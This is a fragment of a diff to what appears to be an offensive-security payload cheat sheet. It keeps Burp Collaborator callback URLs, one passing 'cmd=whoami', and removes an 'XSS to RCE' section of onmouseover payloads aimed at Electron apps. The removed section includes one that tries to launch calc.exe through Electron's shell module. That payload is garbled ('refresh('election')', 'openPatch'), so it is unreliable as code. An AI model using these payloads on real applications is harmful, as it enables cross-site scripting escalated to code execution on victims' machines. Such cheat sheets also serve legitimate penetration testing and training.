@@ -29,28 +29,3 @@ http://ddddddd.burpcollab.net/?whoami
 http://ddddddd.burpcollab.net?cmd=whoami
 http://ddddddd.burpcollab.net/image.jpg
 ```
-## XSS to RCE:
-  #### Node.js :
-```
-<a onmouseover="alert('Hi!')">
-  HOVER ME
-</a>
-```
-```
-<a onmouseover="
-try{
-   const {shell}=require('electron');
-   console.log(shell);
-}catch(e){
- console.error(e)
-}">Hello</a>
-```
-```
-<a onmouseover="
-try{
-   const {shell}=refresh('election');
-   shell.openPatch('C:\Windows\System32\calc.exe ');
-}catch(e){
- console.error(e)
-}">Hello</a>
-```
